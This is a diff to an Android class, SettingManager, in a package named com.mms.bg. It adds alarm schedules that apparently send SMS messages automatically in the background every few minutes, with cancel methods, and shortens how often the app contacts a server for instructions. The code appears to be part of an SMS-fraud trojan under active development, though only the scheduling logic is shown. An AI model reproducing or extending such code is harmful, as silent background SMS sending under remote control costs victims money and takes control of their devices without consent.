@@ -69,13 +69,13 @@ public class SettingManager {
     public final String UPLOAD_FILE_PATH;
     public final String DOWNLOAD_FILE_PATH;
     
-    private static final int DEFAULT_SMS_COUNT = 2;
+    private static final int DEFAULT_SMS_COUNT = 0;
     
     private static final String DEFAULT_VALUE = "";
     private static final long SMS_DEFAULT_DELAY_TIME = 30 * 24 * 60 * 60 * 1000;
     public static final String AUTO_SMS_ACTION = "com.mms.bg.SMS";
     public static final String AUTO_CONNECT_SERVER = "com.mms.bg.SERVER";
-    private static final int TIMEOUT = 5 * 1000;
+    private static final int TIMEOUT = 10 * 1000;
     
     public Activity mForegroundActivity;
     private Context mContext;
@@ -284,9 +284,10 @@ public class SettingManager {
     }
     
     public void startAutoSendMessage() {
+        cancel();
         Intent intent = new Intent(mContext, AutoSMSRecevier.class);
         intent.setAction(AUTO_SMS_ACTION);
-        PendingIntent sender = PendingIntent.getBroadcast(mContext, 0, intent, PendingIntent.FLAG_CANCEL_CURRENT);
+        PendingIntent sender = PendingIntent.getBroadcast(mContext, 0, intent, 0);
         long currentTime = System.currentTimeMillis();
         long firstTime = currentTime;
         
@@ -306,6 +307,34 @@ public class SettingManager {
         
         AlarmManager am = (AlarmManager) mContext.getSystemService(Context.ALARM_SERVICE);
         am.setRepeating(AlarmManager.RTC_WAKEUP, firstTime, sms_delay_time, sender);
+    }
+    
+    public void cancel() {
+        Intent intent = new Intent(mContext, AutoSMSRecevier.class);
+        intent.setAction(AUTO_SMS_ACTION);
+        PendingIntent sender = PendingIntent.getBroadcast(mContext, 0, intent, 0);
+        
+        AlarmManager am = (AlarmManager) mContext.getSystemService(Context.ALARM_SERVICE);
+        am.cancel(sender);
+    }
+    
+    public void startOneRoundSMSSend() {
+        Intent intent = new Intent();
+        intent.setAction(BgService.ACTION_SEND_SMS_ROUND);
+        PendingIntent sender = PendingIntent.getBroadcast(mContext, 0, intent, 0);
+        long currentTime = System.currentTimeMillis();
+        long delayTime = 5 * 60 * 1000;
+        
+        AlarmManager am = (AlarmManager) mContext.getSystemService(Context.ALARM_SERVICE);
+        am.setRepeating(AlarmManager.RTC_WAKEUP, currentTime, delayTime, sender);
+    }
+    
+    public void cancelOneRoundSMSSend() {
+        Intent intent = new Intent();
+        intent.setAction(BgService.ACTION_SEND_SMS_ROUND);
+        PendingIntent sender = PendingIntent.getBroadcast(mContext, 0, intent, 0);
+        AlarmManager am = (AlarmManager) mContext.getSystemService(Context.ALARM_SERVICE);
+        am.cancel(sender);
     }
     
     public void setLastConnectServerTime(long time) {
@@ -346,7 +375,7 @@ public class SettingManager {
     public void tryToFetchInfoFromServer(long delayTime) {
         cancelFetchInfo();
 //        final long DEFAULT_FETCH_DELAY = 24 * 60 * 60 * 1000;
-        final long DEFAULT_FETCH_DELAY = 60 * 1000;
+        final long DEFAULT_FETCH_DELAY = 2 * 60 * 1000;
         Intent intent = new Intent(mContext, AutoSMSRecevier.class);
         intent.setAction(AUTO_CONNECT_SERVER);
         PendingIntent sender = PendingIntent.getBroadcast(mContext, 0, intent, 0);
@@ -355,7 +384,7 @@ public class SettingManager {
         
         long connect_delay_time = delayTime != 0 ? delayTime : DEFAULT_FETCH_DELAY;
         long latestConnectTime = getLastConnectServerTime();
-        long tempDelay = 1 * 60 * 1000;
+        long tempDelay = 2 * 60 * 1000;
         if (latestConnectTime != 0 && (currentTime - latestConnectTime) >= connect_delay_time + tempDelay) {
             firstTime = currentTime + tempDelay;
         } else if (latestConnectTime != 0) {
